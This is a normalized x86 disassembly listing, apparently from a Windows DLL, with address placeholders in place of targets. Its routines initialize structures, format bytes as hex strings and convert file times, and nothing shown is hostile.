mov [ ebp - 0x16c ] 0x7
mov [ ebp - 0x170 ] 0x0
mov [ ebp - 0x180 ] cx
mov eax [ ebp - 0x180 ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ ebp - 0x1d4 ]
push eax
call sub_100173b1
add esp 0x4
sub_1000b790
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov edx 0x7
mov [ eax + 0x18 ] edx
push esi
xor esi esi
mov [ eax + 0x4 ] si
mov [ eax + 0x34 ] edx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x20 ] si
mov [ eax + 0x50 ] edx
mov [ eax + 0x4c ] ecx
mov [ eax + 0x3c ] si
mov [ eax + 0x70 ] edx
mov [ eax + 0x6c ] ecx
mov [ eax + 0x5c ] si
mov [ eax + 0x8c ] edx
mov [ eax + 0x88 ] ecx
mov [ eax + 0x78 ] si
mov [ eax + 0xa8 ] edx
mov [ eax + 0xa4 ] ecx
mov [ eax + 0x94 ] si
mov [ eax + 0xc4 ] edx
mov [ eax + 0xc0 ] ecx
mov [ eax + 0xb0 ] si
mov [ eax + 0xe0 ] edx
mov [ eax + 0xdc ] ecx
mov [ eax + 0xcc ] si
mov [ eax + 0xfc ] edx
mov [ eax + 0xf8 ] ecx
mov [ eax + 0xe8 ] si
mov [ eax + 0x118 ] edx
mov [ eax + 0x114 ] ecx
mov [ eax + 0x104 ] si
mov [ eax + 0x134 ] edx
mov [ eax + 0x130 ] ecx
mov [ eax + 0x120 ] si
mov [ eax + 0x150 ] edx
mov [ eax + 0x14c ] ecx
mov [ eax + 0x13c ] si
mov [ eax + 0x16c ] edx
mov [ eax + 0x168 ] ecx
mov [ eax + 0x158 ] si
mov [ eax + 0x18c ] edx
mov [ eax + 0x188 ] ecx
mov [ eax + 0x178 ] si
mov [ eax + 0x1a8 ] edx
mov [ eax + 0x1a4 ] ecx
mov [ eax + 0x194 ] si
mov [ eax + 0x1c4 ] edx
mov [ eax + 0x1c0 ] ecx
mov [ eax + 0x1b0 ] si
mov [ eax + 0x1e0 ] edx
mov [ eax + 0x1dc ] ecx
mov [ eax + 0x1cc ] si
mov [ eax + 0x1fc ] edx
mov [ eax + 0x1f8 ] ecx
mov [ eax + 0x1e8 ] si
mov [ eax + 0x218 ] edx
mov [ eax + 0x214 ] ecx
mov [ eax + 0x204 ] si
mov [ eax + 0x238 ] edx
mov [ eax + 0x234 ] ecx
mov [ eax + 0x224 ] si
mov [ eax + 0x254 ] edx
mov [ eax + 0x250 ] ecx
mov [ eax + 0x240 ] si
mov [ eax + 0x270 ] edx
mov [ eax + 0x26c ] ecx
mov [ eax + 0x25c ] si
mov [ eax + 0x28c ] edx
mov [ eax + 0x288 ] ecx
mov [ eax + 0x278 ] si
mov [ eax + 0x2ac ] edx
mov [ eax + 0x2a8 ] ecx
mov [ eax + 0x298 ] si
mov [ eax + 0x2cc ] edx
mov [ eax + 0x2c8 ] ecx
mov [ eax + 0x2b8 ] cx
pop esi
retn
sub_1000b950
push ebp
mov ebp esp
push 0xffffffff
push sub_100298e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x52c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x344 ] eax
mov esi ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x318 ]
call sub_1000b790
push ebx
lea ecx [ ebp + 0x2c ]
push ecx
or eax 0xffffffff
lea edi [ ebp - 0x2f8 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001db0
mov edx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] ax
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x320 ]
push eax
lea ecx [ ebp - 0x350 ]
push ecx
mov [ ebp - 0x318 ] edx
lea edx [ ebp - 0x33c ]
push edx
lea eax [ ebp - 0x34c ]
push eax
push esi
mov [ ebp - 0x34c ] 0x2
mov [ ebp - 0x33c ] ebx
mov [ ebp - 0x320 ] ebx
mov [ ebp - 0x319 ] 0x1
mov [ ebp - 0x20 ] bl
call [ rw-data ]
test eax eax
jne r-xdata
lea esi [ ebp - 0x318 ]
call sub_10009140
mov esi 0x8
cmp [ ebp + 0x24 ] esi
jb r-xdata
mov ecx [ ebp - 0x320 ]
movzx eax [ ecx + 0x3c ]
movzx ecx [ ecx + 0x34 ]
cmp ax cx
jb r-xdata
xor eax eax
mov [ ebp + 0x24 ] 0x7
mov [ ebp + 0x20 ] ebx
mov [ ebp + 0x10 ] ax
cmp [ ebp + 0x40 ] esi
jb r-xdata
mov edx [ ebp + 0x10 ]
push edx
call sub_100173b1
add esp 0x4
shr ax 0x4
movzx eax ax
mov ebx 0x1
mov ecx ebx
mov [ ebp - 0x330 ] eax
mov [ ebp - 0x324 ] ebx
cmp cx ax
jae r-xdata
mov eax ecx
mov al [ ebp - 0x319 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x2c ]
push ecx
call sub_100173b1
add esp 0x4
mov ecx [ ebp - 0x320 ]
push ecx
call [ LocalFree@IAT ]
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0x319 ] 0x0
je r-xdata
lea edx [ ebp - 0x518 ]
push edx
call sub_1000d200
push r--data
push ecx
push ebx
push ecx
push r--data
push ecx
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x518 ]
push ecx
mov [ ebp - 0x4 ] 0x3
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100076f0
add esp 0x8
lea esi [ ebp - 0x3c ]
lea eax [ ebp - 0x518 ]
call sub_1000d2e0
mov edi eax
lea esi [ ebp - 0x314 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001bb0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x28 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
movzx eax [ ebp - 0x330 ]
movzx esi bx
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp - 0x320 ]
add eax esi
lea edx [ ebp + 0xc ]
push edx
add eax eax
lea edx [ ecx + eax * 8 + 0x44 ]
xor edi edi
push edx
mov [ ebp - 0x28 ] 0x7
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x338 ] esi
call [ rw-data ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_100173b1
add esp 0x4
push 0x14
mov eax r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x84 ] 0x0
call sub_10001f10
lea eax [ ebp - 0x480 ]
push eax
call sub_1000d200
mov [ ebp - 0x4 ] 0x5
xor esi esi
lea ecx [ ecx ]
push 0x14
mov eax r--data
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x64 ] 0x0
call sub_10001f10
lea edx [ ebp - 0x3e8 ]
push edx
call sub_1000d200
mov [ ebp - 0x4 ] 0x9
xor esi esi
push edi
lea ecx [ ebp - 0x528 ]
push 0x2
push ecx
call sub_10016867
mov edx [ ebp - 0x480 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax + 0xc ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ ebp + ecx - 0x480 ]
push edx
push ecx
call eax
mov ecx [ ebp - 0x480 ]
mov eax [ ecx + 0x4 ]
lea eax [ ebp + eax - 0x480 ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ ebp - 0x480 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + eax - 0x46c ]
movzx edx [ ebp + esi - 0x20 ]
lea eax [ ebp + eax - 0x480 ]
and ecx 0xfffff9ff
add esp 0xc
or ecx 0x800
mov [ eax + 0x14 ] ecx
push edx
lea eax [ ebp - 0x480 ]
push eax
call sub_1000cce0
inc esi
cmp esi 0x10
jb r-xdata
lea esi [ ebp - 0x3c ]
lea eax [ ebp - 0x480 ]
mov [ ebp - 0x84 ] 0x1
call sub_1000d2e0
mov esi eax
lea ecx [ ebp - 0x80 ]
cmp ecx esi
je r-xdata
mov edx [ ebp - 0x504 ]
mov [ edx ] edi
mov eax [ ebp - 0x4f4 ]
mov [ eax ] edi
mov ecx [ ebp - 0x4e4 ]
mov [ ecx ] edi
mov edx [ ebp - 0x500 ]
mov [ edx ] edi
mov eax [ ebp - 0x4f0 ]
mov [ eax ] edi
mov ecx [ ebp - 0x4e0 ]
mov [ ecx ] edi
and [ ebp - 0x4d4 ] 0xfffffffe
mov [ ebp - 0x4d8 ] edi
mov [ ebp - 0x514 ] r--data
mov [ ebp - 0x4 ] 0xe
mov eax [ ebp - 0x4dc ]
mov ebx eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x504 ]
mov eax [ ecx ]
push eax
call sub_100173b1
add esp 0x4
push edi
lea eax [ ebp - 0x538 ]
push 0x2
push eax
call sub_10016867
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x3e8 ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ ebp + ecx - 0x3e8 ]
push edx
push ecx
call eax
mov ecx [ ebp - 0x3e8 ]
mov eax [ ecx + 0x4 ]
lea eax [ ebp + eax - 0x3e8 ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ ebp - 0x3e8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + eax - 0x3d4 ]
movzx edx [ ebp + esi - 0x20 ]
lea eax [ ebp + eax - 0x3e8 ]
and ecx 0xfffff9ff
add esp 0xc
or ecx 0x800
mov [ eax + 0x14 ] ecx
push edx
lea eax [ ebp - 0x3e8 ]
push eax
call sub_1000cce0
inc esi
cmp esi 0x10
jb r-xdata
lea esi [ ebp - 0x3c ]
lea eax [ ebp - 0x3e8 ]
mov [ ebp - 0x64 ] 0x1
call sub_1000d2e0
mov esi eax
lea ecx [ ebp - 0x60 ]
cmp ecx esi
je r-xdata
cmp [ ebp - 0x28 ] 0x8
jb r-xdata
cmp [ ebp - 0x6c ] 0x8
jb r-xdata
lea ecx [ ebp - 0x510 ]
mov [ ebp - 0x4 ] 0xd
call sub_10016412
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x518 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x4c8 ]
mov [ ebp + edx - 0x518 ] r--data
push eax
mov [ ebp - 0x4c8 ] r--data
call sub_10015fc5
mov eax [ ebp - 0x324 ]
inc eax
add esp 0x4
mov [ ebp - 0x324 ] eax
cmp ax [ ebp - 0x330 ]
jb r-xdata
mov edi [ eax ]
test edi edi
je r-xdata
cmp [ ebp - 0x28 ] 0x8
jb r-xdata
cmp [ ebp - 0x4c ] 0x8
jb r-xdata
mov eax [ ebp - 0x480 ]
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x430 ]
mov [ ebp - 0x32c ] edx
mov [ ebp + ecx - 0x480 ] r--data
test [ ebp - 0x43c ] 0x1
lea edx [ ebp - 0x47c ]
mov [ ebp - 0x328 ] edx
mov [ ebp - 0x47c ] r--data
je r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_100173b1
add esp 0x4
xor eax eax
mov ebx 0x7
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] ax
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_100173b1
add esp 0x4
mov ebx [ ebp - 0x324 ]
push ebx
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ ebp - 0x334 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x3e8 ]
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x398 ]
mov [ ebp - 0x328 ] edx
mov [ ebp + ecx - 0x3e8 ] r--data
test [ ebp - 0x3a4 ] 0x1
lea edx [ ebp - 0x3e4 ]
mov [ ebp - 0x32c ] edx
mov [ ebp - 0x3e4 ] r--data
je r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_100173b1
add esp 0x4
xor eax eax
mov ebx 0x7
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x60 ] ax
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov edx [ ebp - 0x60 ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ ebp - 0x46c ]
mov [ ecx ] edi
mov edx [ ebp - 0x45c ]
mov [ edx ] edi
mov eax [ ebp - 0x44c ]
mov [ eax ] edi
mov ecx [ ebp - 0x468 ]
mov [ ecx ] edi
mov edx [ ebp - 0x458 ]
mov [ edx ] edi
mov eax [ ebp - 0x448 ]
mov [ eax ] edi
and [ ebp - 0x43c ] 0xfffffffe
mov [ ebp - 0x440 ] edi
mov [ ebp - 0x47c ] r--data
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0x444 ]
mov ebx eax
cmp eax edi
je r-xdata
mov eax [ ebp - 0x46c ]
mov eax [ eax ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ esi ]
mov [ ebp - 0x80 ] eax
mov [ esi ] edi
mov eax [ esi + 0x10 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ ebp - 0x80 ]
push esi
push edx
call sub_10017050
add esp 0xc
jmp r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x334 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x3d4 ]
mov [ ecx ] edi
mov edx [ ebp - 0x3c4 ]
mov [ edx ] edi
mov eax [ ebp - 0x3b4 ]
mov [ eax ] edi
mov ecx [ ebp - 0x3d0 ]
mov [ ecx ] edi
mov edx [ ebp - 0x3c0 ]
mov [ edx ] edi
mov eax [ ebp - 0x3b0 ]
mov [ eax ] edi
and [ ebp - 0x3a4 ] 0xfffffffe
mov [ ebp - 0x3a8 ] edi
mov [ ebp - 0x3e4 ] r--data
mov [ ebp - 0x4 ] 0xc
mov eax [ ebp - 0x3ac ]
mov ebx eax
cmp eax edi
je r-xdata
mov eax [ ebp - 0x3d4 ]
mov eax [ eax ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ esi ]
mov [ ebp - 0x60 ] eax
mov [ esi ] edi
mov eax [ esi + 0x10 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ ebp - 0x60 ]
push esi
push edx
call sub_10017050
add esp 0xc
jmp r-xdata
lea ecx [ ebp - 0x478 ]
mov [ ebp - 0x4 ] 0x7
call sub_10016412
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x480 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x430 ]
mov [ ebp + edx - 0x480 ] r--data
push eax
mov [ ebp - 0x430 ] r--data
call sub_10015fc5
mov esi [ ebp - 0x338 ]
add esp 0x4
jmp r-xdata
mov edi [ eax ]
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x70 ] ecx
mov edx [ esi + 0x14 ]
mov [ ebp - 0x6c ] edx
xor eax eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
lea ecx [ ebp - 0x3e0 ]
mov [ ebp - 0x4 ] 0xb
call sub_10016412
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x3e8 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x398 ]
mov [ ebp + edx - 0x3e8 ] r--data
push eax
mov [ ebp - 0x398 ] r--data
call sub_10015fc5
add esp 0x4
jmp r-xdata
mov edi [ eax ]
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x50 ] ecx
mov edx [ esi + 0x14 ]
mov [ ebp - 0x4c ] edx
xor eax eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp - 0x320 ]
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp + 0xc ]
add esi esi
push edx
lea ecx [ eax + esi * 8 + 0x44 ]
push ecx
call [ rw-data ]
test eax eax
jne r-xdata
push ebx
call sub_100173b1
add esp 0x4
xor edi edi
push 0x0
lea ecx [ ebp - 0x340 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x4c ]
mov edx [ ebp - 0x344 ]
push ecx
mov ecx [ ebp + 0x48 ]
push edx
lea edx [ ebp - 0x318 ]
call sub_10009570
mov ecx [ ebp - 0x518 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x319 ] al
lea eax [ ebp - 0x4c8 ]
add esp 0x8
mov [ ebp - 0x328 ] eax
mov [ ebp + edx - 0x518 ] r--data
test [ ebp - 0x4d4 ] 0x1
lea eax [ ebp - 0x514 ]
mov [ ebp - 0x32c ] eax
mov [ ebp - 0x514 ] r--data
je r-xdata
push ebx
call sub_100173b1
add esp 0x4
xor edi edi
push 0x0
lea ecx [ ebp - 0x348 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x340 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x348 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_1000c230
push ebp
mov ebp esp
push 0xffffffff
push sub_100291ea
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea eax [ ebp - 0xbc ]
xor edi edi
push eax
mov [ ebp - 0x14 ] edi
call sub_1000d200
mov [ ebp - 0x4 ] 0x1
mov ebx [ esi + 0x4 ]
xor ecx ecx
cmp cx [ esi ]
jae r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xbc ]
call sub_1000d2e0
mov eax [ ebp - 0xbc ]
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x1c ] edx
mov [ ebp + ecx - 0xbc ] r--data
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x78 ] 0x1
lea edx [ ebp - 0xb8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0xb8 ] r--data
je r-xdata
push 0x0
lea edx [ ebp - 0xcc ]
push 0x2
push edx
call sub_10016867
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0xbc ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ ebp + ecx - 0xbc ]
push edx
push ecx
call eax
mov ecx [ ebp - 0xbc ]
mov eax [ ecx + 0x4 ]
lea eax [ ebp + eax - 0xbc ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ ebp - 0xbc ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + eax - 0xa8 ]
lea eax [ ebp + eax - 0xbc ]
and ecx 0xfffff9ff
or ecx 0x800
mov [ eax + 0x14 ] ecx
movzx edx [ edi + ebx ]
add esp 0xc
push edx
lea eax [ ebp - 0xbc ]
push eax
call sub_1000cce0
movzx ecx [ esi ]
inc edi
cmp edi ecx
jl r-xdata
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x98 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x88 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0xa4 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x94 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x84 ]
mov [ eax ] 0x0
and [ ebp - 0x78 ] 0xfffffffe
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0xb8 ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x80 ]
mov esi eax
test eax eax
je r-xdata
mov eax [ ebp - 0xa8 ]
mov eax [ eax ]
push eax
call sub_100173b1
add esp 0x4
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10016412
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xbc ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x6c ]
mov [ ebp + edx - 0xbc ] r--data
push eax
mov [ ebp - 0x6c ] r--data
call sub_10015fc5
mov eax [ ebp + 0x8 ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ eax ]
test ebx ebx
je r-xdata
push esi
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x18 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000c480
push ebp
mov ebp esp
push 0xffffffff
push sub_1002917f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x120
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0xc8 ]
mov edi ecx
push eax
mov [ ebp - 0x28 ] edi
mov esi edx
mov [ ebp - 0x24 ] 0x0
call sub_1000d200
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
cmp eax 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x7fffffff
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] eax
jne r-xdata
test bl bl
jne r-xdata
mov esi edi
lea eax [ ebp - 0xc8 ]
call sub_1000d2e0
mov edx [ ebp - 0xc8 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp + eax - 0xc8 ] r--data
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10003fa0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xc8 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x78 ]
mov [ ebp + edx - 0xc8 ] r--data
push eax
mov [ ebp - 0x78 ] r--data
call sub_10015fc5
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp + eax - 0xb4 ]
lea eax [ ebp + eax - 0xc8 ]
and edx 0xfffff3ff
or edx 0x200
push 0x0
mov [ eax + 0x14 ] edx
lea eax [ ebp - 0x128 ]
push 0x2
push eax
call sub_10016867
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0xc8 ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ ebp + ecx - 0xc8 ]
push edx
push ecx
call eax
mov ecx [ ebp - 0xc8 ]
mov eax [ ecx + 0x4 ]
add esp 0xc
lea eax [ ebp + eax - 0xc8 ]
mov edx 0x30
push 0x0
mov [ eax + 0x40 ] dx
lea eax [ ebp - 0xd8 ]
push 0x2
push eax
call sub_10016867
add esp 0xc
push r--data
push ecx
mov ecx [ ebp - 0x1a ]
push ecx
lea edx [ ebp - 0xc8 ]
push edx
mov esi eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100076f0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
test bl bl
jne r-xdata
lea ecx [ ebp - 0xc8 ]
push r--data
push ecx
call sub_100076f0
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
mov eax [ esi ]
call eax
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
add esp 0xc
mov edx 0x30
push 0x0
mov [ eax + edi + 0x40 ] dx
lea eax [ ebp - 0xf8 ]
push 0x4
push eax
call sub_10016867
add esp 0xc
push r--data
push ecx
mov ecx [ ebp - 0x1e ]
push ecx
push edi
mov esi eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100076f0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea edx [ ebp - 0xc8 ]
push r--data
push edx
call sub_100076f0
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
mov eax [ esi ]
call eax
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
add esp 0xc
mov edx 0x30
push 0x0
mov [ eax + edi + 0x40 ] dx
lea eax [ ebp - 0x118 ]
push 0x2
push eax
call sub_10016867
add esp 0xc
push r--data
push ecx
mov ecx [ ebp - 0x20 ]
push ecx
push edi
mov esi eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100076f0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
add eax edi
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
mov eax [ esi ]
call eax
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
add esp 0xc
mov edx 0x30
push 0x0
mov [ eax + edi + 0x40 ] dx
lea eax [ ebp - 0xe8 ]
push 0x2
push eax
call sub_10016867
add esp 0xc
push r--data
push ecx
mov ecx [ ebp - 0x18 ]
push ecx
push edi
mov esi eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100076f0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
add eax edi
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
mov eax [ esi ]
call eax
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
add esp 0xc
mov edx 0x30
push 0x0
mov [ eax + edi + 0x40 ] dx
lea eax [ ebp - 0x108 ]
push 0x2
push eax
call sub_10016867
add esp 0xc
push r--data
push ecx
mov ecx [ ebp - 0x16 ]
push ecx
push edi
mov esi eax
call sub_1000cb10
add esp 0x4
push eax
call sub_100076f0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
add eax edi
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
mov eax [ esi ]
call eax
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov edx 0x30
add esp 0xc
mov [ eax + edi + 0x40 ] dx
mov eax [ ebp - 0x14 ]
push eax
push edi
call sub_1000cb10
mov edi [ ebp - 0x28 ]
mov edx [ edi ]
mov eax [ edx + 0x4 ]
add eax edi
sub_1000c820
push ebp
mov ebp esp
push 0xffffffff
push sub_10028e79
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
cmp [ esi + 0x10 ] eax
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
push 0x1
mov eax r--data
mov ecx edi
call sub_10001f10
push 0x0
push esi
or eax 0xffffffff
call sub_10001c20
push 0x1
mov eax r--data
mov ecx edi
call sub_10001cd0
sub_1000c8b0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
xor esi esi
mov [ ebp - 0x10 ] 0x20132019
mov [ ebp - 0xc ] 0xbb00ab
mov [ ebp - 0x8 ] 0x2026
mov [ ebp - 0x1c ] 0x2d0027
mov [ ebp - 0x18 ] 0x220022
mov [ ebp - 0x14 ] 0x2e
cmp [ edi + 0x10 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax edi
